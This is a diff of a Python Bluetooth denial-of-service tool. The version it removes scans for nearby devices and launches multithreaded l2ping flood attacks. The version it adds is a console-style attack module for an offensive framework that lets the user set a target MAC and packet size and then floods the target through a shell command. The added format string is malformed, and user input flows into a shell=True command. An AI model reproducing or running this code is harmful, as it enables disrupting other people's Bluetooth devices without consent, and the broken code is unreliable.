@@ -2,84 +2,48 @@ import os
 import threading
 import time
 import subprocess
-def DOS(target_addr, packages_size):
-    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
-
-def printLogo():
-    print('                            Bluetooth DOS Script                            ')
-def main():
-    printLogo()
-    time.sleep(0.1)
-    print('')
-    print('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')
-    if (input("Do you agree? (y/n) > ") in ['y', 'Y']):
-        time.sleep(0.1)
-        os.system('clear')
-        printLogo()
-        print('')
-        print("Scanning ...")
-        output = subprocess.check_output("hcitool scan", shell=True, stderr=subprocess.STDOUT, text=True)
-        lines = output.splitlines()
-        id = 0
-        del lines[0]
-        array = []
-        print("|id   |   mac_addres  |   device_name|")
-        for line in lines:
-            info = line.split()
-            mac = info[0]
-            array.append(mac)
-            print(f"|{id}   |   {mac}  |   {''.join(info[1:])}|")
-            id = id + 1
-        target_id = input('Target id or mac > ')
-        try:
-            target_addr = array[int(target_id)]
-        except:
-            target_addr = target_id
 
 
-        if len(target_addr) < 1:
-            print('[!] ERROR: Target addr is missing')
-            exit(0)
+from colorama import init as colorama_init
+from colorama import Fore
+from colorama import Style
 
-        try:
-            packages_size = int(input('Packages size > '))
-        except:
-            print('[!] ERROR: Packages size must be an integer')
-            exit(0)
-        try:
-            threads_count = int(input('Threads count > '))
-        except:
-            print('[!] ERROR: Threads count must be an integer')
-            exit(0)
-        print('')
-        os.system('clear')
 
-        print("\x1b[31m[*] Starting DOS attack in 3 seconds...")
+options = ["ff:ff:ff:ff:ff:ff", "600", "hci0"]
 
-        for i in range(0, 3):
-            print('[*] ' + str(3 - i))
-            time.sleep(1)
-        os.system('clear')
-        print('[*] Building threads...\n')
+def bluetooth_dos():
+	try:
+		pmt0 = f"{Fore.GREEN}plv{Fore.BLUE}/bluetooth/ble_dos>{Style.RESET_ALL}"
+		cmd = input(pmt0).lower()
+		if(cmd[0:12]=='show options'):
+			print('\nBluetooth DoS attack options:')
+			print('--------------------------------')
+			print('TARGET  ===>  ' + options[0] + '  |  Target of the DoS attack')
+			print('SIZE  ===>  ' + options[1] + '  |  Size of junk packets to send')
+			print('IFACE    ===>  ' + options[2] + '  |  Bluetooth interface to use\n')
+		elif(cmd[0:3]=='set'):
+			if(cmd[4:10]=='target'):
+				options[0] = cmd[11:28]
+				print('\nTARGET   ===>  ' + options[0] + '\n')
+			elif(cmd[4:8]=='size'):
+				options[1] = cmd[9:12]
+				print('\nSIZE   ===>  ' + options[1] + '\n')
+			elif(cmd[4:9]=='iface'):
+				options[2] = cmd[10:24]
+				print('\nIFACE   ===>  ' + options[2] + '\n')
+			else:
+				print('\nUnknown option!\n')	
+		elif(cmd[0:3]=='run' or cmd[0:7]=='execute'):
+			shell0="l2ping -i %s -s % -f %s" % (options[2], int(options[1]), options[0])
+			print(f"{Fore.RED}Bluetooth junk packet DoS attack started!{Style.RESET_ALL}")
+			subprocess.Popen(shell0, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
+		
+		elif(cmd[0:4]=='exit'):
+			print("\nGood luck, Plova!\n")
+			exit(0)
+		else:
+			print("\nUnknown command! Available options:\nshow options\nset [option] [value]\nexit\nrun\n")
+		bluetooth_dos()
+	except(KeyboardInterrupt):
+		print("\nExiting module...\n")
 
-        for i in range(0, threads_count):
-            print('[*] Built thread №' + str(i + 1))
-            threading.Thread(target=DOS, args=[str(target_addr), str(packages_size)]).start()
-
-        print('[*] Built all threads...')
-        print('[*] Starting...')
-    else:
-        print('Bip bip')
-        exit(0)
-
-if __name__ == '__main__':
-    try:
-        os.system('clear')
-        main()
-    except KeyboardInterrupt:
-        time.sleep(0.1)
-        print('\n[*] Aborted')
-        exit(0)
-    except Exception as e:
-        time.sleep(0.1)
-        print('[!] ERROR: ' + str(e))
